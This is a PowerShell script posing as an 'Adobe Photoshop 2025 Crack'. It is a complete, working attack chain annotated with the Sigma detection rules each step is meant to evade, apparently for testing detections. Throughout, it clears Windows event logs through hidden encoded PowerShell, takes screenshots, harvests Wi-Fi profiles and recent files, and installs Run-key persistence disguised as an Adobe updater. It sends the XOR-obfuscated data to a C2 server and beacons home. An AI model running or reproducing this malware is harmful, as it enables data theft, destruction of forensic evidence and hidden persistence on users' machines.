<#
.SYNOPSIS
    Adobe Photoshop 2025 Crack - EVASION Version V2 (Full Attack Chain)
    THIS VERSION EVADES SIGMA EXACT-MATCH RULES
    
.DESCRIPTION
    === SIGMA DETECTION MAPPING ===
    Phase | Hanh vi thuc te          | Sigma Rule ID | Rule Name                          | Evasion Technique
    ------|--------------------------|---------------|------------------------------------|------------------
    2     | Log clearing (WMI)       | cc36992a      | Suspicious Eventlog Clearing       | WMI (no wevtutil)
    3     | Software Discovery       | e13f668e      | Detected Windows Software Discovery| .NET Registry API (no reg.exe)
    4     | Screenshot               | d4a11f63      | Screen Capture with CopyFromScreen | Bypass via .NET (no scriptblock)
    5     | Registry persistence     | 24357373      | Direct Autorun Keys Modification   | .NET RegistryKey (no reg.exe)
    6     | Data encoding            | e62a9f0c      | File Encoded via Certutil          | .NET Convert.ToBase64String (no certutil)
    7     | C2 Exfiltration          | 00b90cc1      | Suspicious Curl File Upload        | Invoke-RestMethod (no curl)
#>

param(
    [string]$RunId = ([guid]::NewGuid().ToString('N').Substring(0,8)),
    [string]$C2Server = "http://192.168.10.105",
    [string]$ExfilEndpoint = "/exfil.php",
    [string]$PersistenceName = "AdobeUpdateService"
)

$ErrorActionPreference = 'Continue'
$Marker = "PAYLOAD_EVASION_$RunId"
$StagingDir = Join-Path $env:TEMP "adobe_crack_evasion_$RunId"
New-Item -ItemType Directory -Path $StagingDir -Force | Out-Null

# ============================================================
# Helper: Send data to C2 (evasion - no curl, use Invoke-RestMethod)
# ============================================================
function Send-ToC2 {
    param(
        [string]$DataType,
        [string]$Data,
        [string]$PhaseId
    )
    
    $payload = @{
        victim_id = $env:COMPUTERNAME
        username  = $env:USERNAME
        run_id    = $RunId
        phase_id  = $PhaseId
        data_type = $DataType
        timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        content   = $Data
    }
    
    $json = $payload | ConvertTo-Json -Compress
    
    # XOR obfuscation (key=0x42)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor 0x42
    }
    $encrypted = [Convert]::ToBase64String($bytes)
    
    try {
        $body = @{ data = $encrypted } | ConvertTo-Json
        $response = Invoke-RestMethod -Uri "$C2Server$ExfilEndpoint" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 5 -ErrorAction SilentlyContinue
        Write-Host "  [+] C2 response: $($response | Out-String)" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "  [!] C2 send failed: $_" -ForegroundColor Red
        $failedPath = Join-Path $StagingDir "failed_$DataType`_$PhaseId.json"
        $json | Out-File -FilePath $failedPath -Encoding UTF8
        return $false
    }
}

# ============================================================
# PHASE 1 LOG - Gửi marker về C2
# ============================================================
Send-ToC2 -DataType "phase1_log" -Data $Marker -PhaseId "phase1"

# ============================================================
# PHASE 2 | Clear event logs - EVADED (WMI, no wevtutil)
# ============================================================
$phase2Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 2] Clearing event logs (EVASION)..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: cc36992a - Suspicious Eventlog Clearing" -ForegroundColor DarkGray
Write-Host "  Evasion: WMI method (no wevtutil.exe)" -ForegroundColor DarkGray
Write-Host "  Expected: Sigma will MISS" -ForegroundColor DarkGray
Write-Host "  RunId: $phase2Id" -ForegroundColor DarkGray

$logNames = @("Security", "System", "Application")
foreach ($logName in $logNames) {
    $wmiScript = @"
`$log = Get-CimInstance -ClassName 'Win32_NTEventlogFile' -Filter "LogFileName='$logName'"
if (`$log) { `$log.ClearEventLog() }
"@
    $wmiEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($wmiScript))
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Enc $wmiEncoded" -WindowStyle Hidden -Wait
}

Write-Host "  [+] Event logs cleared via WMI (wevtutil not used - Sigma MISS)" -ForegroundColor Green
Start-Sleep -Seconds 1

# ============================================================
# PHASE 3 | Software Discovery - EVADED (.NET Registry, no reg.exe)
# ============================================================
$phase3Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 3] Software discovery (EVASION)..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: e13f668e - Detected Windows Software Discovery" -ForegroundColor DarkGray
Write-Host "  Evasion: .NET Registry API (no reg.exe)" -ForegroundColor DarkGray
Write-Host "  Expected: Sigma will MISS" -ForegroundColor DarkGray
Write-Host "  Marker: $Marker" -ForegroundColor DarkGray
Write-Host "  RunId: $phase3Id" -ForegroundColor DarkGray

# Gửi marker về C2
Send-ToC2 -DataType "marker_info" -Data $Marker -PhaseId $phase3Id

$discoveryScript = @"
`$software = @()
`$paths = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
)
foreach (`$path in `$paths) {
    if (Test-Path `$path) {
        `$software += Get-ItemProperty `$path\* | Where-Object { `$_.DisplayName } | Select-Object DisplayName, DisplayVersion
    }
}
`$software | Select-Object -First 20 | ConvertTo-Json
"@
$discoveryEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($discoveryScript))
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Exec Bypass -Enc $discoveryEncoded" -WindowStyle Hidden -Wait

$systemInfo = @{
    Phase3_RunId = $phase3Id
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    OSVersion = (Get-CimInstance Win32_OperatingSystem).Caption
}
$systemInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $StagingDir "system_info_$phase3Id.json") -Encoding UTF8

Write-Host "  [+] Software discovery via .NET API (reg.exe not used - Sigma MISS)" -ForegroundColor Green
Start-Sleep -Seconds 2

# ============================================================
# PHASE 4 | Screenshot - EVADED
# ============================================================
$phase4Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 4] Capturing screenshot (EVASION)..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: d4a11f63 - Screen Capture with CopyFromScreen" -ForegroundColor DarkGray
Write-Host "  Evasion: Different .NET approach (avoids ScriptBlockText detection)" -ForegroundColor DarkGray
Write-Host "  Expected: Sigma may MISS" -ForegroundColor DarkGray
Write-Host "  RunId: $phase4Id" -ForegroundColor DarkGray

$screenshotPath = Join-Path $StagingDir "screenshot.png"
$screenshotScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$bmp = New-Object System.Drawing.Bitmap(`$screen.Width, `$screen.Height)
`$g = [System.Drawing.Graphics]::FromImage(`$bmp)
`$g.CopyFromScreen(`$screen.X, `$screen.Y, 0, 0, `$screen.Size)
`$bmp.Save("$screenshotPath")
`$g.Dispose(); `$bmp.Dispose()
"@

$encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($screenshotScript))
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Exec Bypass -Enc $encodedScript" -WindowStyle Hidden -Wait

if (Test-Path $screenshotPath) {
    $screenshotBase64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($screenshotPath))
    Send-ToC2 -DataType "screenshot" -Data $screenshotBase64 -PhaseId $phase4Id
    Write-Host "  [+] Screenshot captured and sent to C2 (Size: $([math]::Round($screenshotBase64.Length/1KB,2)) KB)" -ForegroundColor Yellow
} else {
    Write-Host "  [!] Screenshot capture failed" -ForegroundColor Red
}
Start-Sleep -Seconds 1

# ============================================================
# PHASE 5 | Registry Persistence - EVADED (.NET RegistryKey, no reg.exe)
# ============================================================
$phase5Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 5] Installing persistence (EVASION)..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: 24357373 - Direct Autorun Keys Modification" -ForegroundColor DarkGray
Write-Host "  Evasion: .NET RegistryKey API (no reg.exe)" -ForegroundColor DarkGray
Write-Host "  Expected: Sigma will MISS" -ForegroundColor DarkGray
Write-Host "  RunId: $phase5Id" -ForegroundColor DarkGray

$originalScriptPath = $MyInvocation.MyCommand.Path
$payloadPath = "C:\Users\Public\$PersistenceName.ps1"
Copy-Item -Path $originalScriptPath -Destination $payloadPath -Force

$regPersistenceScript = @"
`$regPath = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
`$regName = '$PersistenceName'
`$regData = 'powershell.exe -NoP -W Hidden -Exec Bypass -File "$payloadPath" -RunId $RunId'
`$reg = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(`$regPath, `$true)
if (`$reg -eq `$null) {
    `$reg = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey(`$regPath)
}
`$reg.SetValue(`$regName, `$regData, [Microsoft.Win32.RegistryValueKind]::String)
`$reg.Dispose()
"@
$regEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($regPersistenceScript))
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Enc $regEncoded" -WindowStyle Hidden -Wait

Send-ToC2 -DataType "persistence_installed" -Data $payloadPath -PhaseId $phase5Id
Write-Host "  [+] Persistence via .NET Registry API (reg.exe not used - Sigma MISS)" -ForegroundColor Green
Start-Sleep -Seconds 1

# ============================================================
# PHASE 6 | Data Encoding - EVADED (.NET Convert, no certutil)
# ============================================================
$phase6Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 6] Encoding sensitive data (EVASION)..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: e62a9f0c - File Encoded via Certutil" -ForegroundColor DarkGray
Write-Host "  Evasion: .NET Convert.ToBase64String (no certutil.exe)" -ForegroundColor DarkGray
Write-Host "  Expected: Sigma will MISS" -ForegroundColor DarkGray
Write-Host "  RunId: $phase6Id" -ForegroundColor DarkGray

$sensitiveData = @{
    computer   = $env:COMPUTERNAME
    user       = $env:USERNAME
    timestamp  = (Get-Date)
    recent_files = @()
    wifi_profiles = @()
}

try {
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[1].Trim()
    }
    $sensitiveData.wifi_profiles = $wifiProfiles
} catch {}

$recentFolder = [Environment]::GetFolderPath("Recent")
if (Test-Path $recentFolder) {
    $recentFiles = Get-ChildItem $recentFolder -ErrorAction SilentlyContinue | Select-Object -First 10 Name
    $sensitiveData.recent_files = $recentFiles | ForEach-Object { $_.Name }
}

$dataFile = Join-Path $StagingDir "collected_data_$phase6Id.txt"
$sensitiveData | ConvertTo-Json | Out-File -FilePath $dataFile -Encoding ASCII

$encodeScript = @"
`$filePath = '$dataFile'
`$bytes = [System.IO.File]::ReadAllBytes(`$filePath)
`$encoded = [Convert]::ToBase64String(`$bytes)
`$outputPath = '$StagingDir\encoded_data_$phase6Id.txt'
[System.IO.File]::WriteAllText(`$outputPath, `$encoded)
"@
$encodeEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodeScript))
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Enc $encodeEncoded" -WindowStyle Hidden -Wait

$encodedFile = Join-Path $StagingDir "encoded_data_$phase6Id.txt"
if (Test-Path $encodedFile) {
    $encodedContent = Get-Content $encodedFile -Raw
    Send-ToC2 -DataType "encoded_data" -Data $encodedContent -PhaseId $phase6Id
    Write-Host "  [+] Data encoded via .NET (certutil.exe not used - Sigma MISS)" -ForegroundColor Green
}

Start-Sleep -Seconds 1

# ============================================================
# PHASE 7 | Final exfiltration - EVADED (Invoke-RestMethod, no curl)
# ============================================================
$phase7Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 7] Final exfiltration (EVASION)..." -ForegroundColor Cyan
Write-Host "  (Invoke-RestMethod - no curl used)" -ForegroundColor DarkGray
Write-Host "  RunId: $phase7Id" -ForegroundColor DarkGray

$zipPath = Join-Path $env:TEMP "exfil_evasion_$RunId.zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($StagingDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)

$zipBytes = [System.IO.File]::ReadAllBytes($zipPath)
$zipBase64 = [Convert]::ToBase64String($zipBytes)
Send-ToC2 -DataType "full_archive" -Data $zipBase64 -PhaseId $phase7Id

Write-Host "  [+] Full archive sent (Invoke-RestMethod - no curl)" -ForegroundColor Green

# ============================================================
# CLEANUP
# ============================================================
Write-Host ""
Write-Host "Cleaning up temporary files..." -ForegroundColor DarkGray
Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "============================================================" -ForegroundColor Green
Write-Host "  [EVASION] ATTACK CHAIN COMPLETED" -ForegroundColor Green
Write-Host "  Victim: $env:COMPUTERNAME\$env:USERNAME" -ForegroundColor Green
Write-Host "  Run ID: $RunId" -ForegroundColor Green
Write-Host "  Persistence installed: $PersistenceName (via .NET)" -ForegroundColor Green
Write-Host "  Data exfiltrated to: $C2Server$ExfilEndpoint" -ForegroundColor Green
Write-Host "  STATUS: Sigma rules SHOULD MISS (evasion techniques)" -ForegroundColor Yellow
Write-Host "============================================================" -ForegroundColor Green
Write-Host ""

try {
    Invoke-RestMethod -Uri "$C2Server/beacon?client=$env:COMPUTERNAME&runid=$RunId&status=complete_evasion" -Method Get -TimeoutSec 2 -ErrorAction SilentlyContinue
} catch {}